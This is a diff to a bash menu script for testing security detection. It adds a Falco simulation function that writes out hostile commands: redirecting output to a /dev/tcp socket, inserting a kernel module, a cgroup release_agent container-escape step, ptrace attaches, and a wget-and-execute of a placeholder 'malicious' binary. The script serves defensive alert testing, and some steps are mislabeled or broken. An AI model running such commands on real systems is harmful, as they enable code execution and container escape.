@@ -17,8 +17,9 @@ display_menu() {
     echo "2. Kubernetes Simulations"
     echo "3. Linux Simulations"
     echo "4. Run Additional Security Commands"
-    echo "5. Cleanup Simulations"
-    echo "6. Exit"
+    echo "5. Falco Simulation Commands"
+    echo "6. Cleanup Simulations"
+    echo "7. Exit"
     echo ""
 }
 
@@ -56,6 +57,44 @@ simulate_linux() {
     echo
 }
 
+# Falco Simulation Commands
+simulate_falco() {
+    echo "Running Falco Simulation Commands..."
+    
+    echo "1. Redirecting STDOUT/STDIN to a network connection..."
+    bash -c 'exec 1>/dev/tcp/127.0.0.1/4444; echo "test"'
+
+    echo "2. Injecting a kernel module..."
+    sudo insmod /path/to/module.ko
+
+    echo "3. Launching debugfs in a privileged container..."
+    docker run --privileged -it --rm ubuntu:latest debugfs
+
+    echo "4. Creating release_agent for container escape simulation..."
+    echo "/path/to/exploit" | sudo tee /sys/fs/cgroup/release_agent
+
+    echo "5. Attaching PTRACE to a process..."
+    sudo strace -p $(pgrep bash)
+
+    echo "6. Performing PTRACE anti-debug attempt..."
+    sudo gdb --pid=$(pgrep bash) -batch -ex "set logging on" -ex "ptrace PTRACE_TRACEME"
+
+    echo "7. Executing script from /dev/shm..."
+    echo -e '#!/bin/bash\necho "test"' > /dev/shm/test.sh && chmod +x /dev/shm/test.sh && /dev/shm/test.sh
+
+    echo "8. Dropping and executing a binary in a container..."
+    docker run --rm -it ubuntu:latest bash -c "wget http://example.com/malicious; chmod +x malicious; ./malicious"
+
+    echo "9. Attempting SSH connection on a non-standard port..."
+    ssh -p 8080 user@host
+
+    echo "10. Fileless execution using memfd_create..."
+    python3 -c 'import os; os.system("exec -c echo hello")'
+
+    echo "Falco simulations completed."
+    echo
+}
+
 # Additional Security Commands
 run_additional_commands() {
     echo "Running Additional Security Commands..."
@@ -89,14 +128,15 @@ cleanup_simulations() {
 # Main Program
 while true; do
     display_menu
-    read -rp "Select an option [1-6]: " choice
+    read -rp "Select an option [1-7]: " choice
     case $choice in
         1) simulate_aws ;;
         2) simulate_kubernetes ;;
         3) simulate_linux ;;
         4) run_additional_commands ;;
-        5) cleanup_simulations ;;
-        6) echo "Exiting. Stay secure!"; exit 0 ;;
+        5) simulate_falco ;;
+        6) cleanup_simulations ;;
+        7) echo "Exiting. Stay secure!"; exit 0 ;;
         *) echo "Invalid option. Please try again." ;;
     esac
 done
